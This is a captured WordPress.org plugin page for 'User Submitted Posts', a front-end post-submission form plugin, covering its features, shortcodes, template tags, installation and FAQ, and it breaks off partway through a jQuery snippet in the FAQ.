=== Content from wordpress.org_a1ff40fc_20250120_233942.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ‚ÜóÔ∏é](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ‚ÜóÔ∏é](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ‚ÜóÔ∏é](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ‚ÜóÔ∏é](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

User Submitted Posts ‚Äì Enable Users to Submit Posts from the Front End

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fuser-submitted-posts&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fuser-submitted-posts&locale=en_US)

Search plugins

![](https://ps.w.org/user-submitted-posts/assets/banner-772x250.jpg?rev=1392443)
![](https://ps.w.org/user-submitted-posts/assets/icon-256x256.png?rev=2567685)
# User Submitted Posts ‚Äì Enable Users to Submit Posts from the Front End

By [Jeff Starr](https://plugin-planet.com/)

[Download](https://downloads.wordpress.org/plugin/user-submitted-posts.20241026.zip)

* [Details](https://wordpress.org/plugins/user-submitted-posts/#description)
* [Reviews](https://wordpress.org/plugins/user-submitted-posts/#reviews)
* [Installation](https://wordpress.org/plugins/user-submitted-posts/#installation)
* [Development](https://wordpress.org/plugins/user-submitted-posts/#developers)

[Support](https://wordpress.org/support/plugin/user-submitted-posts/)

## Description

**üèÜ The #1 Plugin for User-Generated Content!**

*Enable visitors to submit posts from the front end of your site.*

User Submitted Posts (USP) provides a front-end form that enables visitors to submit posts and upload images. Just add the following shortcode to any Post, Page, or Widget:

[user-submitted-posts]

That‚Äôs all there is to it! Your site now can accept user generated content. Everything is super easy to customize via Plugin Settings page.

The post-submission form may include any/all of the following fields:

* Name
* Email
* URL
* Post Title
* Post Tags
* Post Category
* Post Content
* Custom Field 1
* Custom Field 2
* Custom Checkbox
* Challenge Question
* Google reCAPTCHA (v2 or v3)
* Post Images
* Agree to Terms

Each of these fields may be set as required, optional, or disabled. You can set the Post Status of submitted posts as ‚ÄúPending‚Äù, ‚ÄúDraft‚Äù, ‚ÄúPublish Immediately‚Äù, or publish after a specific number of approved posts.

USP enables users to upload any number of images when submitting a post. You can customize the min/max width, height, and number of submitted images.

USP also includes a Login/Register Form, and three shortcodes to control access and restrict content (more information below).

*üöÄ User Submitted Posts is the first and best plugin for front-end content!*

### ‚ú® Core Features

* Includes a fast & secure post-submission form
* Includes a simple login/register/password form
* Display forms anywhere via shortcode or template tag
* Includes shortcode to display a list of submitted posts
* Includes shortcodes to control access and restrict content
* Includes template tags to display submitted post content
* Includes configurable Custom Field for the post-submit form
* You choose which fields to display on the post-submit form
* Automatically display all submitted content on the front end
* Display post-submit & login forms via Text or HTML widgets
* Receive email notification alerts for submitted posts
* Image preview thumbnails for selected images
* NEW: front-end post deletion (via email link)

*Boost your site value with user-generated content!*

### ‚ú® Form Features

* Google reCAPTCHA: v2 (‚ÄúI am not a bot‚Äù) or v3 (hidden recaptcha)
* Built-in client-side form validation with [Parsley](https://parsleyjs.org/)
* Stops spam via input validation, captcha, and hidden field
* Use either Challenge Question, Google reCAPTCHA, or both!
* Option to set submitted images as WP Featured Images
* Option to require users to be logged in to use the form
* Option to use WP‚Äôs Rich Text Editor (RTE) for post content
* Redirect user to any URL or current page after submission
* Use the default HTML5 form or customize your own form
* Use the default form styles or add your own custom CSS
* Form fields may be set as optional or required
* Many action & filter hooks for advanced customization

*USP is simple to use and built with clean, secure code via the WP API!*

### ‚ú® More Features

* Translated into 20+ languages
* Automatically detects logged-in users
* Regularly updated to stay current with WordPress
* Multiple emails supported in email alerts
* Option to set a default post category
* Option to disable loading of form JavaScript & CSS
* Option to specify URL for targeted resource loading
* Option to disable tracking of IP addresses
* Option to specify custom email alert subject
* Option to specify custom email alert message
* Option to submit posts as WP Posts or Pages
* Choose which categories users are allowed to select
* Assign submitted posts to any registered user
* Customizable success, error, and upload messages
* Works with or without Gutenberg Block Editor

*USP provides many options to help you create the perfect form!*

### ‚ú® Content Restriction

USP provides three ‚ÄúAccess Control‚Äù shortcodes to control access and restrict content. Here are some examples to give you an idea of how it works.

Display form and/or content only to users with a specific capability:

```
[usp_access cap="read" deny="Message for users without read capability"]
    [user-submitted-posts] // Put the USP form or any other content here.
[/usp_access]

```

Display form and/or any content to logged-in users:

```
[usp_member deny="Message for users who are not logged in"]
    [user-submitted-posts] // Put the USP form or any other content here.
[/usp_member]

```

Display form and/or any content to visitors only:

```
[usp_visitor deny="Message for users who are logged in"]
    [user-submitted-posts] // Put the USP form or any other content here.
[/usp_visitor]

```

You can add and use Access Control shortcodes on any WP Post or Page. Tip: you can find this information (and more) in the plugin settings, under ‚ÄúDisplay the Form‚Äù > ‚ÄúAccess Control‚Äù.

### ‚ú® Image Uploads

* Optionally enable visitors to upload any number of images
* Specify minimum & maximum allowed images for each post
* Specify minimum & maximum width & height for images
* Automatically set submitted images as Featured Images
* Automatically display submitted images on the front end
* Includes template tags to display submitted images
* Includes shortcodes to display submitted images

### ‚ú® Post Management

* Custom Fields saved w/ each post: name, IP, URL, and image URLs
* Set posts to any status: Draft, Pending, Publish, or Moderate
* One-click filtering of submitted posts on the Admin Posts page

*Plus much more! Too many features to list them all!*

### ‚ú® Translations

User Submitted Posts supports translation into any language. Current translations include the following languages:

```
Arabic                - usp-ar
Bengali               - usp-bn_BD
Chinese (Simplified)  - usp-zh_CN
Chinese (Traditional) - usp-zh_TW
Czech                 - usp-cs_CZ
Dutch                 - usp-nl_NL
French (France)       - usp-fr_FR
German                - usp-de_DE
Greek                 - usp-el
Hebrew                - usp-he_IL
Hindi                 - usp-hi_IN
Irish                 - usp-ga
Italian               - usp-it_IT
Japanese              - usp-ja
Korean                - usp-ko_KR
Norwegian             - usp-no
Persian               - usp-fa_IR
Polish                - usp-pl_PL
Portuguese (Brazil)   - usp-pt_BR
Portuguese (Portugal) - usp-pt_PT
Punjabi               - usp-pa_IN
Romanian              - usp-ro_RO
Russian               - usp-ru_RU
Serbian               - usp-sr_RS
Slovenian             - usp-sl_SI
Spanish (Spain)       - usp-es_ES
Swedish               - usp-sv_SE
Turkish               - usp-tr_TR
Urdu                  - usp-ur

```

**Note:** most of the default translations are made via Google Translate. So they are automated and may be a little rough. Feel free to make your own translation as desired. Need a translation into your language? [Let me know!](https://plugin-planet.com/support/#contact)

### ‚ú® Pro Version

**USP Pro** now available at [Plugin Planet](https://plugin-planet.com/usp-pro/)!

Pro version includes many, many more features and settings, with unlimited custom forms, infinite custom fields, multimedia file uploads, and much more. [Check it out ¬ª](https://plugin-planet.com/usp-pro/)

### ‚ú® Privacy

**User Data:** This plugin enables users to submit post content. It collects data *only* from users who voluntarily submit content via the USP form. The only involuntary data that is collected is the IP address of the person submitting the form. The plugin provides an option to disable IP collection completely.

**Cookies:** This plugin uses simple cookies to enable dynamic form functionality. No cookies are used for any other purpose.

**Services:** This plugin provides an option to enable Google reCaptcha, which is provided by Google as a third-party service. For details on privacy and more, please refer to official documentation for [Google reCaptcha](https://developers.google.com/recaptcha/). No other outside services or locations are accessed/used by this plugin.

### ‚ú® Developer

User Submitted Posts is developed and maintained by [Jeff Starr](https://twitter.com/perishable), 15-year [WordPress developer](https://plugin-planet.com/) and [book author](https://books.perishablepress.com/).

### ‚ú® Support Development

I develop and maintain this free plugin with love for the WordPress community. To show support, you can [make a donation](https://monzillamedia.com/donate.html) or purchase one of my books:

* [The Tao of WordPress](https://wp-tao.com/)
* [Digging into WordPress](https://digwp.com/)
* [.htaccess made easy](https://htaccessbook.com/)
* [WordPress Themes In Depth](https://wp-tao.com/wordpress-themes-book/)
* [Wizard‚Äôs SQL Recipes for WordPress](https://books.perishablepress.com/downloads/wizards-collection-sql-recipes-wordpress/)

And/or purchase one of my premium WordPress plugins:

* [BBQ Pro](https://plugin-planet.com/bbq-pro/) ‚Äì Super fast WordPress firewall
* [Blackhole Pro](https://plugin-planet.com/blackhole-pro/) ‚Äì Automatically block bad bots
* [Banhammer Pro](https://plugin-planet.com/banhammer-pro/) ‚Äì Monitor traffic and ban the bad guys
* [GA Google Analytics Pro](https://plugin-planet.com/ga-google-analytics-pro/) ‚Äì Connect WordPress to Google Analytics
* [Simple Ajax Chat Pro](https://plugin-planet.com/simple-ajax-chat-pro/) ‚Äì Unlimited chat rooms
* [USP Pro](https://plugin-planet.com/usp-pro/) ‚Äì Unlimited front-end forms

Links, tweets and likes also appreciated. Thanks! üôÇ

## Screenshots

* [![](https://ps.w.org/user-submitted-posts/assets/screenshot-1.gif?rev=1392443)](https://ps.w.org/user-submitted-posts/assets/screenshot-1.gif?rev=1392443)

  USP Settings Screen (panels toggled closed)
* [![](https://ps.w.org/user-submitted-posts/assets/screenshot-2.gif?rev=1392443)](https://ps.w.org/user-submitted-posts/assets/screenshot-2.gif?rev=1392443)

  USP Plugin Settings, showing default options (panels toggle open/closed)
* [![](https://ps.w.org/user-submitted-posts/assets/screenshot-3.gif?rev=1392443)](https://ps.w.org/user-submitted-posts/assets/screenshot-3.gif?rev=1392443)

  USP Form (with all fields enabled)
* [![](https://ps.w.org/user-submitted-posts/assets/screenshot-4.gif?rev=1392443)](https://ps.w.org/user-submitted-posts/assets/screenshot-4.gif?rev=1392443)

  USP Form (with just a few fields enabled)
* [![](https://ps.w.org/user-submitted-posts/assets/screenshot-5.gif?rev=1392443)](https://ps.w.org/user-submitted-posts/assets/screenshot-5.gif?rev=1392443)

  Example showing how to display the form on a Page (using a shortcode)

## Installation

### How to install the plugin

1. Upload the plugin to your blog and activate
2. Configure your options via the plugin settings
3. Display the form via shortcode or template tag

[More info on installing WP plugins](https://wordpress.org/support/article/managing-plugins/#installing-plugins)

### How to use the plugin

To display the form on any WP Post, Page, or widget, add the shortcode:

```
[user-submitted-posts]

```

Or, to display the form anywhere in your theme, add the template tag:

```
<?php if (function_exists('user_submitted_posts')) user_submitted_posts(); ?>

```
### Customizing the form

There are three main ways of customizing the form:

* Plugin settings, you can show/hide fields, configure options, etc.
* Custom form template (see ‚ÄúCustom Submission Form‚Äù for more info)
* By using USP action/filter hooks (advanced)

USP Hooks:

```
Filters:
usp_post_status
usp_post_author
usp_form_shortcode
usp_mail_subject
usp_mail_message
usp_new_post
usp_input_validate
usp_require_login
usp_default_title

Actions:
usp_submit_success
usp_submit_error
usp_insert_before
usp_insert_after
usp_files_before
usp_files_after

```

Check out the [complete list of action hooks for User Submitted Posts](https://perishablepress.com/action-filter-hooks-user-submitted-posts/)

More info about [WordPress Actions and Filters](https://codex.wordpress.org/Plugin_API#Hooks.2C_Actions_and_Filters)

### Custom Submission Form

Out of the box, User Submitted Posts provides a highly configurable submission form. Simply visit the plugin settings to control which fields are displayed, set the Challenge Question, configure submitted images, and much more.

There are situations, however, where advanced form configuration may be required. In order to allow for this, USP makes it possible to create a custom submission form. Here are the steps:

First, copy these two plugin files:

```
/user-submitted-posts/resources/usp.css
/user-submitted-posts/views/submission-form.php

```

Then, paste those two files into a directory named `/usp/` in your theme:

```
/wp-content/themes/your-theme/usp/usp.css
/wp-content/themes/your-theme/usp/submission-form.php

```

Lastly, visit the plugin settings and change ‚ÄúForm style‚Äù to ‚ÄúCustom Form + CSS‚Äù. You now may customize the two files as desired; they will not be overwritten when the plugin is updated. For help with making basic changes to the custom form, check out the [USP FAQs](https://perishablepress.com/faqs-user-submitted-posts/#customize-form) at Perishable Press.

Alternately, you can set the option ‚ÄúForm style‚Äù to ‚ÄúHTML5 Form + Disable CSS‚Äù to use the default USP form along with your own CSS. FYI: here is a list of [USP CSS selectors](https://m0n.co/e).

Or, to go further with unlimited custom forms, [check out USP Pro](https://plugin-planet.com/usp-pro/) üôÇ

### Displaying submitted posts

User-submitted posts are handled by WordPress as regular WP Posts. So they are displayed along with your other posts according to your theme design. Additionally, each submitted post includes a set of Custom Fields that include the following information:

* `is_submission` ‚Äì indicates that the post is a user-submitted post
* `user_submit_image` ‚Äì the URL of the submitted image (one custom field per image)
* `user_submit_ip` ‚Äì the IP address of the submitted-post author
* `user_submit_name` ‚Äì the name of the submitted-post author
* `user_submit_url` ‚Äì the submitted URL
* `usp_custom_field` ‚Äì configurable Custom Field

There are numerous ways to display these Custom Fields. The easiest way is to visit the plugin settings and configure the options available under ‚ÄúAuto-Display Content‚Äù. There you can enable auto-display of submitted email address, URL, and images. Note that submitted images also are uploaded to the WP Media Library.

For more flexibility, you can use a variety of WP Template Tags (e.g., [get\_post\_meta()](https://codex.wordpress.org/Function_Reference/get_post_meta)) to display Custom Fields. Here are some tutorials for more information:

* [WordPress Custom Fields, Part I: The Basics](https://perishablepress.com/wordpress-custom-fields-tutorial/)
* [WordPress Custom Fields, Part II: Tips and Tricks](https://perishablepress.com/wordpress-custom-fields-tips-tricks/)

And here are some tutorials that may help with custom display of submitted images:

* [Display all images attached to post](https://wp-mix.com/display-images-attached-post/)
* [Display images with links](https://wp-mix.com/display-images-with-user-submitted-posts/)

Also, here is a [Helper Plugin to display Custom Fields](https://plugin-planet.com/usp-pro-custom-field-helper-plugin/). It originally is designed for use with USP Pro, but also works great with the free version of USP.

### Auto Display Images

To automatically display submitted images on the front end, visit the plugin settings, ‚ÄúImages Auto-Display‚Äù and select whether to display the images before or after post content. Save changes.

### Featured Images

To set submitted images as Featured Images (aka Post Thumbnails) for submitted posts, visit the plugin settings, ‚ÄúImage Uploads‚Äù and check the box to enable ‚ÄúFeatured Image‚Äù. Save changes.

### Shortcodes

User Submitted Posts provides a set of useful shortcodes. Check out the ‚ÄúDisplay the Form‚Äù panel in the plugin settings for examples and more information.

```
[user-submitted-posts]                        : displays the form on any Post or Page
[usp-login-form]                              : displays a login/register/password form
[usp_display_posts]                           : displays list of all submitted posts
[usp_gallery]                                 : displays a gallery of all submitted images for the current post
[usp-reset-button url="https://example.com/"] : displays a button to reset the form
[usp_access cap="read" deny=""][/usp_access]  : limits access to specific user capability
[usp_visitor deny=""][/usp_visitor]           : limits access to visitors (not logged in) only
[usp_member deny=""][/usp_member]             : limits access to logged-in users

```

Here is more info about these shortcodes:

**`[user-submitted-posts]`**

Displays the post-submit form. This shortcode does not accept any attributes.

**`[usp-login-form]`**

Displays the login/register/password form. This shortcode does not accept any attributes.

To add Google reCaptcha to the form, you can use any good reCaptcha plugin. Here are a few examples:

* [reCAPTCHA Lite](https://wordpress.org/plugins/recaptcha-lite/)
* [Smart Captcha (reCAPTCHA)](https://wordpress.org/plugins/smart-recaptcha/)
* [reCaptcha by BestWebSoft](https://wordpress.org/plugins/google-captcha/)

These are not endorsements for these plugins. They have been tested and work with the USP login/register/password form.

**`[usp_display_posts]`**

Displays a list of all submitted posts. This shortcode accepts two optional attributes, ‚Äúuserid‚Äù and ‚Äúnumposts‚Äù. Examples:

```
[usp_display_posts]                           : default displays all submitted posts by all authors
[usp_display_posts userid="current"]          : displays all submitted posts by current logged-in user
[usp_display_posts userid="1"]                : displays all submitted posts by registered user with ID = 1
[usp_display_posts userid="Pat Smith"]        : displays all submitted posts by author name "Pat Smith"
[usp_display_posts userid="all"]              : displays all submitted posts by all users/authors
[usp_display_posts userid="all" numposts="5"] : limit to 5 posts from all users
[usp_display_posts post_type="page"]          : display only submitted pages

```

So the shortcode attributes can be used to customize the post list as desired. Note that the Pro version of USP provides many more options for the [display-posts shortcode](https://plugin-planet.com/usp-pro-display-list-submitted-posts/).

**`[usp_gallery]`**

**Note:** This shortcode works only when added to a submitted post. It does nothing when added anywhere else.

Displays a gallery of all submitted images for the current post. Customize via the following attributes:

```
size    = image size as thumbnail, medium, large or full -> default = thumbnail
format  = whether to make the image a linked image       -> default = image (can use image or image_link)
target  = whether to open linked image in new tab        -> default = blank (can use blank or self)
class   = optional custom class name(s)                  -> default = none
number  = the number of images to display for each post  -> default = 100
post_id = an optional post ID to use                     -> default = false (uses global/current post)

Check out the source code inline notes for more info

```

**`[usp-reset-button]`**

Displays a button to reset the form. Accepts the following attributes:

```
class  = classes for the parent element (optional, default: none)
value  = link text (optional, default: "Reset form")
url    = the URL where your form is displayed (required, default: none)
custom = any attributes or custom code for the link element (optional, default: none)

```

Note that the `url` attribute accepts `%%current%%` for the current URL (useful when the form is displayed in the sidebar).

**`[usp_access]`**

Limits access to specific user capability. Example:

```
[usp_access cap="read"]
    Content for users that have "read" access
[/usp_access]

```

The `cap` attribute specifies the required capability or capabilities (comma-separated). This shortcode also accepts an optional `deny` attribute. The `deny` attribute displays a message to users who are denied access. Tip: to include markup in the deny message, you can use `{tag}` to display `<tag>`. Check out the ‚ÄúDisplay the Form‚Äù panel in the plugin settings for examples and more info.

**`[usp_visitor]`**

Limits access to visitors (not logged in) only. Example:

```
[usp_visitor]
    Content for for users who are not logged in
[/usp_visitor]

```

This shortcode accepts an optional `deny` attribute. The `deny` attribute displays a message to users who are denied access. Tip: to include markup in the deny message, you can use `{tag}` to display `<tag>`. Check out the ‚ÄúDisplay the Form‚Äù panel in the plugin settings for examples and more info.

**`[usp_member]`**

Limits access to logged-in users. Example:

```
[usp_member]
    Content for for users who are logged in
[/usp_member]

```

This shortcode accepts an optional `deny` attribute. The `deny` attribute displays a message to users who are denied access. Tip: to include markup in the deny message, you can use `{tag}` to display `<tag>`. Check out the ‚ÄúDisplay the Form‚Äù panel in the plugin settings for examples and more info.

### Template tags

User Submitted Posts provides a set of useful template tags:

```
/*
    Display the Post-Submission Form
    Usage: <?php if (function_exists('user_submitted_posts')) user_submitted_posts(); ?>
*/

user_submitted_posts()

/*
    Display the Login/Register/Password Form
    Usage: <?php if (function_exists('usp_login_form')) usp_login_form(); ?>
*/

usp_login_form()

/*
    Display a configurable list of submitted posts
    Usage: <?php if (function_exists('usp_display_posts')) echo usp_display_posts(array('userid' => 'all', 'numposts' => -1)); ?>
*/

usp_display_posts()

/*
    Check if post is a submitted post
    Returns true or false
    Usage: <?php if (usp_is_public_submission()) return true; ?>
*/

usp_is_public_submission()

/*
    Get all image URLs
    Returns an array of image URLs that are attached to the current submitted post
    Usage: <?php $images = usp_get_post_images(); foreach ($images as $image) echo $image; ?>
*/

usp_get_post_images()

/*
    Display all images
    Outputs a set of <img> tags for images attached to the current submitted post
    Usage: <?php usp_post_attachments($size, $beforeUrl, $afterUrl, $numberImages, $postId); ?>
    Parameters:
        $size         = image size: thumbnail, medium, large or full -> default = full
        $beforeUrl    = text/markup displayed before each image URL  -> default = <img src="
        $afterUrl     = text/markup displayed after each image URL   -> default = " />
        $numberImages = number of images to display for each post    -> default = false (display all)
        $postId       = an optional post ID to use                   -> default = uses global post
*/

usp_post_attachments()

/*
    Display submitted author name and URL
    This tag displays one of the following:
        - The author's submitted name as a link (if both 'User Name' and 'User URL' fields are included in the form)
        - The author's submitted name as plain text (if 'User Name' is included in the form, but 'User URL' is not included)
        - The author's registered username as a link to the author's post archive (if 'User Name' is not included in the form)

    Usage: <?php usp_author_link(); ?>
*/

usp_author_link()

/*
    Get an array of image URLs, wrapped in optional HTML
    Syntax: <?php if (function_exists('usp_get_images')) $images = usp_get_images($size, $format, $target, $class, $number, $post_id); ?>
    Usage:  <?php if (function_exists('usp_get_images')) $images = usp_get_images(); foreach ($images as $image) echo $image; ?>
    Parameters:
            $size    = image size as thumbnail, medium, large or full -> default = thumbnail
            $format  = whether to make the image a linked image       -> default = image (can use image or image_link)
            $target  = whether to open linked image in new tab        -> default = blank (can use blank or self)
            $class   = optional custom class name(s)                  -> default = none
            $number  = the number of images to display for each post  -> default = 100
            $post_id = an optional post ID to use                     -> default = false (uses global/current post)

    Check out the source code inline notes for more info
*/

usp_get_images()

```

These template tags should work out of the box when included in your theme template file(s). Keep in mind that for some of the tags to work, there must be some existing submitted posts and/or images available.

The source code for these tags is located in `/library/template-tags.php` and `shortcode-login.php`.

### Upgrades

To upgrade User Submitted Posts, remove the old version and replace with the new version. Or just click ‚ÄúUpdate‚Äù from the Plugins screen and let WordPress do it for you automatically.

**Important!** The `/custom/` directory is deprecated. If you are using a custom form template, please move it to `/wp-content/your-theme/usp/`. For more information, check out the ‚ÄúCustom Submission Form‚Äù section under [Installation](https://wordpress.org/plugins/user-submitted-posts/#installation).

**Note:** uninstalling the plugin from the WP Plugins screen results in the removal of all settings from the WP database. Submitted posts are NOT removed if you deactivate the plugin, reset default options, or uninstall the plugins; that is, all submitted posts must be removed manually.

### Restore Default Options

To restore default plugin options, either uninstall/reinstall the plugin, or visit the plugin settings > Restore Default Options.

### Uninstalling

User Submitted Posts cleans up after itself. All plugin settings will be removed from your database when the plugin is uninstalled via the Plugins screen. Submitted posts are NOT removed if you deactivate the plugin, reset default options, or uninstall the plugins; that is, *all submitted posts must be removed manually*.

### Pro Version

Pro version of USP now available! USP Pro includes many more awesome features and settings, with unlimited custom forms, infinite custom fields, multimedia file uploads, and much, much more.

* [Check out USP Pro for virtually limitless form-building action ¬ª](https://plugin-planet.com/usp-pro/)
* [Read what users are saying about USP Pro ¬ª](https://plugin-planet.com/testimonials/)

### Like the plugin?

If you like USP, please take a moment to [give a 5-star rating](https://wordpress.org/support/plugin/user-submitted-posts/reviews/?rate=5#new-post). It helps to keep development and support going strong. Thank you!

## FAQ

### Can you add this feature or that feature?

Please check the [Pro version of USP](https://plugin-planet.com/usp-pro/), which includes many of the most commonly requested features from users. The free version also may include new features in future updates.

### Images are not uploaded or displaying

If everything is configured properly, USP will display submitted images on the front-end. If that is not happening, here are some things to check:

* Make sure that the setting ‚ÄúImages Auto-Display‚Äù is enabled
* And/or make sure that the setting ‚ÄúFeatured Image‚Äù is enabled
* And/or make sure that your theme is set up to display submitted images

Assuming that everything is set up to display submitted images, here are some further things to check:

* Is there any error message when trying to submit an image?
* Check that the submitted images are uploaded to the Media Library
* Check that the URL of the submitted image is attached to the submitted post as a Custom Field (on Edit Post screen)
* Check the permission settings on the upload folder(s) by ensuring that you can successfully upload image files directly via the Media Uploader
* Double-check that all the ‚ÄúImage Uploads‚Äù settings make sense, and that the images being uploaded meet the specified requirements

Note: when changing permissions on files and folders, it is important to use the least-restrictive settings possible. If you have to use more permissive settings, it is important to secure the directory against malicious activity. For more information check out: [Secure Media Uploads](https://digwp.com/2012/09/secure-media-uploads/)

### How to set submitted image as the featured image?

Here are the steps:

1. Visit USP settings > Options panel > Image Uploads > Featured Image
2. Check the box and click ‚ÄúSave Settings‚Äù to save your changes

Note that this setting merely assigns the submitted image as the Featured Image; it‚Äôs up to your theme‚Äôs single.php file to include `the_post_thumbnail()` to display the Featured Images. If your theme is not so equipped, [check out this tutorial at WP-Mix](https://wp-mix.com/set-attachment-featured-image/).

### How to require login?

Visit the plugin settings and enable the option to ‚ÄúRequire User Login‚Äù. That will display the submission form only to logged-in users. To go further and require login for other types of content, there are many techniques available to you. For more information check out my WP-Mix post, [WordPress Require User Login](https://wp-mix.com/wordpress-require-user-login/), which provides a good summary of the possibilities. Also note: [USP Pro includes built-in shortcodes](https://plugin-planet.com/usp-pro-display-form-logged-in-users/) to display forms and other content to registered/logged-in users and/or guests/logged-out users.

### How do I change the appearance of the submission form?

The easiest way to customize the form is via the plugin settings. There you can choose one of the following form configurations:

* HTML5 Form + Default CSS (Recommended)
* HTML5 Form + Disable CSS (Provide your own styles)
* Custom Form + Custom CSS (Provide your own form template & styles)

Additionally, you can configure the settings to show/hide specific fields, control the number and size of submitted images, customize the Challenge Question, and much more.

To go beyond what‚Äôs possible with the plugin settings, USP enables creation of a custom submission form. To learn how, check out the ‚ÄúCustom Submission Form‚Äù section under [Installation](https://wordpress.org/plugins/user-submitted-posts/installation/). And for advanced customization, developers can use [USP action and filter hooks](https://perishablepress.com/action-filter-hooks-user-submitted-posts/).

Or, to go further with unlimited custom forms, [check out USP Pro](https://plugin-planet.com/usp-pro/) üôÇ

### What is the ‚Äúalternate‚Äù form?

Inside of the `/views/` directory, you will find an alternate form template named `submission-form-alt.php`. This template is identical to that used for the default form, with the exception that it returns the post-submit form in addition to the success message. You can use the alternate form template by following the steps provided via the ‚ÄúCustom Submission Form‚Äù section of the plugin documentation/readme.

### What about security and spam?

User Submitted Posts uses the WordPress API to keep everything secure, fast, and flexible. The plugin also features Google reCAPTCHA, Challenge Question, and hidden anti-spam field to stop automated spam and bad bots.

### Can I include video?

The free version of USP supports uploads of images only, but some hosted videos may be included in the submitted content (textarea) by simply including the video URL on its own line. See [this page](https://codex.wordpress.org/Embeds) for more info. Note that [USP Pro](https://plugin-planet.com/usp-pro/) enables users to [upload video and much more](https://plugin-planet.com/usp-pro-allowed-file-types/#file-formats).

### How do I reset the plugin settings?

To reset plugin settings to factory defaults:

1. Visit ‚ÄúRestore Default Options‚Äù in the plugin settings
2. Check the box and save your changes
3. Deactivate the plugin and then reactivate it
4. Plugin settings now are restored to defaults

Restoring default settings does not delete any submitted posts. Even if you completely remove the plugin, the submitted posts will not be deleted. You have to remove them manually, if desired.

### How do I enable the ‚ÄúAdd Media‚Äù button for all users?

Question: How do I enable the ‚ÄúAdd Media‚Äù button for all users (even if not registered)?

Answer: Users must have sufficient capabilities to access the Media Library and the ‚ÄúAdd Media‚Äù button. This is a security measure aimed at preventing foul play. The Pro version of USP provides an option to [enable Add Media uploads for all user levels](https://plugin-planet.com/usp-pro-enable-non-admin-users-upload-media/).

### Can you explain the setting ‚ÄúRegistered Username‚Äù?

When ‚ÄúRegistered Username‚Äù is enabled:

* If the user is logged in, their registered username is used as the Post Author
* If the user is logged out, the setting ‚ÄúAssigned Author‚Äù is used as the Post Author

When ‚ÄúRegistered Username‚Äù is disabled:

* The setting ‚ÄúAssigned Author‚Äù always is used as the Post Author for all users (whether logged in or not)

### How can I translate this plugin?

Currently the easiest and most flexible method is to [use GlotPress to translate USP](https://translate.wordpress.org/projects/wp-plugins/user-submitted-posts). That is the recommended translation route going forward, but for the time being you may also translate using a plugin such as [Loco Translate](https://wordpress.org/plugins/loco-translate/). FYI, USP‚Äôs translation files are located in the `/languages/` directory.

### Why am I not receiving the Email Alerts?

Normally the plugin sends an Email Alert each time a post is submitted. If that is not happening in your case, you will need to troubleshoot your setup. Here is a guide on [Troubleshooting Email](https://perishablepress.com/email-troubleshooting-guide/) that should help.

### How to disable image preview feature?

To disable the image-preview thumbnail feature, add the following line to the plugin setting, ‚ÄúCustom Content‚Äù:

```
<script>var usp_disable_previews = true;</script>

```

Save changes and done.

### How to disable fancy category/tag select script?

USP uses the Chosen.js library to enhance the behavior and appearance of the Category and Tag fields. The enhanced fields will be displayed when either/both of the following are true:

* The option ‚ÄúMultiple Categories‚Äù is enabled (for Category field)
* The option ‚ÄúUse Existing Tags‚Äù is enabled (for Tag field)

If you want to disable the fancy Chosen script for these fields, you can do so by adding the following code snippet to your WordPress site:

```
<script>var usp_disable_chosen = true;</script>

```

Save changes and done. Also just FYI, here is a guide that explains [how to add custom code to WordPress](https://digwp.com/2022/02/custom-code-wordpress/).

### How to change the language for Google reCaptcha?

By default, the Google reCaptcha field is displayed in English. To change that to some other language, first locate the two-digit abbreviation for your language [here](https://developers.google.com/recaptcha/docs/language). Then add the following code to your theme (or child theme) functions.php, or add via [custom plugin](https://digwp.com/2022/02/custom-code-wordpress/):

```
function usp_recaptcha_querystring($query) { return 'en'; }
add_filter('usp_recaptcha_querystring', 'usp_recaptcha_querystring');

```

Notice where it says `en`, that is the two-character language code you want to replace with your own. Then save changes and done.

### Where can I check out a demo of the USP form?

There is a simplified [USP Demo](https://perishablepress.com/wp/wp-content/online/pages/user-submitted-posts-demo.html) at Perishable Press. Note the demo form is non-functional, just there to give you a general idea. The actual form provided by the plugin has more features, functionality, etc.

### How to allow blank targets in post content?

By default, USP removes any `target="_blank"` attributes in submitted post content. This is a recommended security feature. It is possible however to allow blank targets:

```
function usp_content_patterns($array) { return array(); }
add_filter('usp_content_patterns', 'usp_content_patterns');

```

That code can be added via theme (or child theme) functions.php, or add via [custom plugin](https://digwp.com/2022/02/custom-code-wordpress/).

### How to disable all HTML tags in submitted posts?

Add the code snippet provided [here](https://perishablepress.com/faqs-user-submitted-posts/#allowed-tags).

### How does the remote delete post link work?

When `%%delete_link%%` is included in your email alert template, a link will be included that the user can click to delete their submitted post. This works when the user who submitted the post is logged in to WordPress. It does not work for users who are not logged in, or are not the post author. For more details and tips, check out the [USP FAQs](https://perishablepress.com/faqs-user-submitted-posts/#delete-post-message) at Perishable Press.

### How to remove placeholder text on submission form?

You can either enable the custom form and modify the output/HTML directly, or you can just add the following to the plugin‚Äôs ‚ÄúCustom Content‚Äù option:

```
<script>jQuery(document).ready(function($) {
    $('.usp-title label').text('This is the label');
    $('.usp-title input').attr('placeholder', 'This is the placeholder');
